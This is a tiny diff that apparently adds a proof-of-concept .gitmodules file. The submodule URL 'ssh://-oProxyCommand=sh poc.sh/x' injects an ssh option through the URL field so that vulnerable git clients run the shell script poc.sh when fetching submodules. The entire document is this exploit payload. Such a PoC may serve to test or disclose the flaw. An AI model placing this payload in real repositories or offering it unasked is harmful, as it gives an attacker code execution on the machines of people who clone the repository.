@@ -1,0 +1,3 @@
+[submodule "poc"]
+	path = poc
+	url = ssh://-oProxyCommand=sh poc.sh/x
